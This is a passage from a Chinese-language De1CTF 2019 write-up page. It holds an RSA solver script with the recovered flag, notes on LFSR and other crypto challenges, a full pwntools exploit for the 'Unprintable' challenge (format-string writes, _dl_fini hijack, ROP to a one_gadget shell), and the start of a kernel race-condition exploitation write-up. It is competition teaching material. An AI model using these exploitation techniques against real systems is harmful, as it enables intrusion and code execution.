class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> binascii,gmpy2</span><br><span class="line"><span class="comment"># from data import e1,e2,p,q1p,q1q,hint,flag,q2</span></span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line">p=gmpy2.iroot(CRT(n, c), <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"p = "</span>,p</span><br><span class="line"><span class="comment"># ====================got p</span></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000</span>):</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(ce1+n*i,<span class="number">42</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">res=gmpy2.iroot(ce1+n*i,<span class="number">42</span>)[<span class="number">0</span>]</span><br><span class="line">e1=res</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000</span>):</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(ce2+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">res=gmpy2.iroot(ce2+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">e2=res-tmp</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"e1 = "</span>,e1</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e2 = "</span>,e2</span><br><span class="line"><span class="comment"># ====================got e1,e2</span></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yafu got q1p,q1q</span></span><br><span class="line">q1p = <span class="number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835693</span></span><br><span class="line">q1q = <span class="number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span></span><br><span class="line"><span class="keyword">if</span> q1p&gt;q1q:</span><br><span class="line">q1p,q1q=q1q,q1p</span><br><span class="line"></span><br><span class="line"><span class="comment"># below is not necessary</span></span><br><span class="line">phi=(q1p<span class="number">-1</span>)*(q1q<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(e,phi)==<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">hint=pow(c,d,n)</span><br><span class="line">hint=binascii.unhexlify(hex(hint)[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"hint = "</span>,hint</span><br><span class="line"><span class="comment"># ====================got  q1p as q1</span></span><br><span class="line"><span class="comment"># flag=int(binascii.hexlify(flag),16)</span></span><br><span class="line">q1=q1p</span><br><span class="line"><span class="keyword">print</span> <span class="string">"q1 = "</span>,q1</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="number">14</span>==gmpy2.gcd(e1,(p<span class="number">-1</span>)*(q1<span class="number">-1</span>)))</span><br><span class="line"><span class="keyword">assert</span>(<span class="number">14</span>== gmpy2.gcd(e2,(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)))</span><br><span class="line">e1=e1//<span class="number">14</span>;e2=e2//<span class="number">14</span></span><br><span class="line">n1=p*q1;n2=p*q2</span><br><span class="line">phi1=(p<span class="number">-1</span>)*(q1<span class="number">-1</span>);phi2=(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d1=gmpy2.invert(e1,phi1);d2=gmpy2.invert(e2,phi2)</span><br><span class="line">f1=pow(c1,d1,n1);f2=pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line"></span><br><span class="line">f3,lcm = GCRT([n1,n2],[f1,f2])</span><br><span class="line"><span class="keyword">assert</span>(f3%n1==f1);<span class="keyword">assert</span>(f3%n2==f2);<span class="keyword">assert</span>(lcm==q1*q2*p)</span><br><span class="line">n3=q1*q2</span><br><span class="line">c3=f3%n3</span><br><span class="line">phi3=(q1<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(<span class="number">7</span>,phi3)==<span class="number">1</span>)</span><br><span class="line">d3=gmpy2.invert(<span class="number">7</span>,phi3)</span><br><span class="line">m3=pow(c3,d3,n3)</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">    flag=gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    print(binascii.unhexlify(hex(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p =  109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br><span class="line"><span class="comment"># e1 =  15218928658178</span></span><br><span class="line"><span class="comment"># e2 =  381791429275130</span></span><br><span class="line"><span class="comment"># hint =  "orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!"</span></span><br><span class="line"><span class="comment"># q1 =  127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span></span><br><span class="line"><span class="comment"># de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span></span><br><span class="line"><span class="comment"># [Finished in 0.7s]</span></span><br></pre></td></tr></table></figure><h2><span id="babylfsr">Babylfsr</span></h2><p>你可以在<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr/" target="_blank" rel="noopener">CTF-WIKI</a>的这个部分找到有关lfsr的基本知识。并且在<code>BM algorithm</code>下面提到可以用2n的序列恢复mask和key的方法。在这个挑战中我们知道的序列的长度只有(2n-8bits)，但是我们可以通过约束条件<code>FLAG[7:11]=='1224'</code>去爆破剩下的8bits。然后恢复mask，恢复key，最终得到明文</p><h4><span id="exp">exp</span></h4><ol type="1"><li><p>Code/exp.sage(解题脚本,当然你也可以使用B-M算法恢复mask)</p></li><li><p>Code/task.py(使用KEY和MASK生成序列的脚本)</p></li><li><p>Code/output(task.py的输出)</p></li><li><p>Code/secret.py(包含MASK,KEY和FLAG) ## Obscured Github不太支持数学公式渲染。你可以在本地渲染并查看WP。 <img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/crypto/Obscured/pic/sol_zh.jpg" alt="avatar"> <img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/crypto/Obscured/pic/code_zh.jpg" alt="avatar"></p></li></ol><h2><span id="mini-purε">Mini Purε</span></h2><p>Github不太支持数学公式渲染。你可以在本地渲染并查看WP。 <img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/crypto/Mini%20Purε/pic/sol_zh.jpg" alt="avatar"> <img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/crypto/Mini%20Purε/pic/code_zh.jpg" alt="avatar"> # pwn ## Unprintable 这题其实是pwnable tw上printable一道题的变种</p><p>理论上可以不用打印栈地址出来，只要预测栈后三位就可以了</p><p>首先是劫持控制流，栈上面残留了一个ld.so的地址</p><p>在exit的时候会执行dl_fini函数，里面有一段比较有趣的片段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;_dl_fini+819&gt;:call   QWORD PTR [r12+rdx*8]</span><br></pre></td></tr></table></figure><p>rdx固定为0，r12来自下面的代码片段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;_dl_fini+777&gt;:mov    r12,QWORD PTR [rax+0x8]</span><br><span class="line">&lt;_dl_fini+781&gt;:mov    rax,QWORD PTR [rbx+0x120]</span><br><span class="line">&lt;_dl_fini+788&gt;:add    r12,QWORD PTR [rbx]</span><br></pre></td></tr></table></figure><p>rbx指向的刚好就是栈上残留的ld.so的地址，因此我们可以控制[rbx]的值</p><p>r12默认指向的是fini_array，通过控制rbx，我们可以让r12指向bss，也就是我们可以劫持控制流了</p><p>但是劫持控制流之后呢？</p><p>我们可以再跳回main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004007A3                 mov     edx, 1000h      ; nbytes</span><br><span class="line">.text:00000000004007A8                 mov     esi, offset buf ; buf</span><br><span class="line">.text:00000000004007AD                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004007B2                 call    read</span><br></pre></td></tr></table></figure><p>再次读内容到bss段，再printf出来</p><p>如果比较细心的话，可以发现这个时候栈上第23个参数刚好指向的是printf的返回地址，也就是我们可以在printf之后再跳回0x4007A3，也就是能无限循环printf</p><p>有了无限循环printf，那么就和平常的有循环的printf一样做了</p><p>这个时候我们就有了任意写，可以写栈上printf返回地址后面的内容，写一个bss段的地址，再配合 pop rsp这个gadget就可以进行rop了</p><p>这里还有一个小坑，就是printf超过0x2000个字节之后用 %hn 写不了值，所以要爆破到适合的栈地址，不过概率也挺高的</p><p>有了rop之后呢？我们还是leak不了，这个时候可以借助一个神奇的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006E8                 adc     [rbp+48h], edx</span><br></pre></td></tr></table></figure><p>rbp和edx我们都是可以控制的，刚好bss段中有stdin,stdout,sterr这几个值，指向的是libc</p><p>所以我们可以利用这个gadget将stderr改成one_gadget，再利用__libc_csu_init中的 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure></p><p>就可以get shell了</p><p>get shell之后就挺简单了，利用重定向拿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag &gt;&amp;0</span><br></pre></td></tr></table></figure><h4><span id="exp">exp</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug=1</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p=process(&apos;./unprintable&apos;)</span><br><span class="line">    #p=process(&apos;&apos;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc.so&apos;&#125;)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&apos;&apos;,)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">def wait(x=True):</span><br><span class="line">    #raw_input()</span><br><span class="line">    sleep(0.3)</span><br><span class="line"></span><br><span class="line">def write_addr(addr,sz=6):</span><br><span class="line">    t = (stack+0x40)%0x100</span><br><span class="line">    v = p64(addr)</span><br><span class="line">    for i in range(sz):</span><br><span class="line">        if t+i != 0:</span><br><span class="line">            se(&apos;%&apos;+str(t+i)+&apos;c%18$hhn%&apos;+str(1955-t-i)+&apos;c%23$hn\x00&apos;)</span><br><span class="line">        else:</span><br><span class="line">            se(&apos;%18$hhn%1955c%23$hn&apos;)</span><br><span class="line">        wait()</span><br><span class="line">        tv = ord(v[i])</span><br><span class="line">        if tv != 0:</span><br><span class="line">            se(&apos;%&apos;+str(tv)+&apos;c%13$hhn%&apos;+str(1955-tv)+&apos;c%23$hn\x00&apos;)</span><br><span class="line">        else:</span><br><span class="line">            se(&apos;%13$hhn%1955c%23$hn&apos;)</span><br><span class="line">        wait()</span><br><span class="line"></span><br><span class="line">def write_value(addr,value,addr_sz=6):</span><br><span class="line">    write_addr(addr,addr_sz)</span><br><span class="line">    se(&apos;%&apos;+str(ord(value[0]))+&apos;c%14$hhn%&apos;+str(1955-ord(value[0]))+&apos;c%23$hn\x00&apos;)</span><br><span class="line">    wait()</span><br><span class="line">    ta = p64(addr)[1]</span><br><span class="line">    for i in range(1,len(value)):</span><br><span class="line">        tmp = p64(addr+i)[1]</span><br><span class="line">        if ta!=tmp:</span><br><span class="line">            write_addr(addr+i,2)</span><br><span class="line">            ta = tmp</span><br><span class="line">        else:</span><br><span class="line">            write_addr(addr+i,1)</span><br><span class="line">        if ord(value[i]) !=0:</span><br><span class="line">            se(&apos;%&apos;+str(ord(value[i]))+&apos;c%14$hhn%&apos;+str(1955-ord(value[i]))+&apos;c%23$hn\x00&apos;)</span><br><span class="line">        else:</span><br><span class="line">            se(&apos;%14$hhn%1955c%23$hn\x00&apos;)</span><br><span class="line">        wait()</span><br><span class="line"></span><br><span class="line">buf = 0x601060+0x100+4</span><br><span class="line"></span><br><span class="line">ru(&apos;This is your gift: &apos;)</span><br><span class="line">stack = int(ru(&apos;\n&apos;),16)-0x118</span><br><span class="line"></span><br><span class="line">if stack%0x10000 &gt; 0x2000:</span><br><span class="line">    p.close()</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">ret_addr = stack - 0xe8</span><br><span class="line"></span><br><span class="line">se(&apos;%&apos;+str(buf-0x600DD8)+&apos;c%26$hn&apos;.ljust(0x100,&apos;\x00&apos;)+p64(0x4007A3))</span><br><span class="line">wait()</span><br><span class="line"></span><br><span class="line">tmp = (stack+0x40)%0x10000</span><br><span class="line"></span><br><span class="line">se(&apos;%c&apos;*16+&apos;%&apos;+str(tmp-16)+&apos;c%hn%&apos;+str((163-(tmp%0x100)+0x100)%0x100)+&apos;c%23$hhn\x00&apos;)</span><br><span class="line"></span><br><span class="line">wait()</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">rop = 0x601060+0x200</span><br><span class="line"></span><br><span class="line">write_value(stack,p64(rop)[:6])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line"></span><br><span class="line">prbp = 0x400690</span><br><span class="line">prsp = 0x40082d</span><br><span class="line">adc = 0x4006E8</span><br><span class="line">arsp = 0x0400848</span><br><span class="line">prbx = 0x40082A </span><br><span class="line">call = 0x400810 </span><br><span class="line">stderr = 0x601040 </span><br><span class="line"></span><br><span class="line">payload = p64(arsp)*3</span><br><span class="line">payload += flat(prbx,0,stderr-0x48,rop,0xFFD2BC07,0,0,call)</span><br><span class="line">payload += flat(adc,0,prbx,0,0,stderr,0,0,0,0x400819)</span><br><span class="line"></span><br><span class="line">se((&apos;%&apos;+str(0x82d)+&apos;c%23$hn&apos;).ljust(0x200,&apos;\0&apos;)+payload)</span><br><span class="line"></span><br><span class="line">print(hex(stack))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="race">Race</span></h2><h4><span id="一-竞态泄露slab地址">一、竞态泄露slab地址</span></h4><p>题目很明显就是copy_to_user和copy_from_user时的竞争删除导致的漏洞，为了扩大竞争条件的窗口期需要mmap一块内存，当copy_to_user复制到用户空间时会引发缺页中断，这样可能会导致进程切换。需要注意的是复制的大小不能是8字节，不然再多的删除进程也是没用的，具体可以看copy_to_user的<a href="https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/uaccess.h#L149" target="_blank" rel="noopener">实现</a>。由于本地和服务器环境有一些差别，竞争删除的进程数会有一点不同。</p><p>理想的效果：</p><table><tbody><tr class="odd"><td style="text-align: center;">test_write</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: center;">copy_to_user</td><td style="text-align: left;"></td></tr><tr class="odd"><td style="text-align: center;">缺页中断</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: center;"></td><td style="text-align: left;">test_del</td></tr><tr class="odd"><td style="text-align: center;"></td><td style="text-align: left;">kfree释放buffer</td></tr><tr class="even"><td style="text-align: center;">copy_to_user</td><td style="text-align: left;"></td></tr></tbody></table><p>这样就可以顺利拿到slab地址</p><h4><span id="二-分配大量内存占位physmap">二、分配大量内存，占位physmap</span></h4><p>就mmap大量地址吧，qemu给了128M内存，进程可以顺利申请64M内存，这样就占了一半的内存，后面有50%的几率跳到控制的<a href="https://www.cnblogs.com/0xJDchen/p/6143102.html" target="_blank" rel="noopener">physmap</a>。（实际上找个好一点的偏移基本上100%成功）</p><h4><span id="三-竞态写释放后的slab-object">三、竞态写释放后的slab 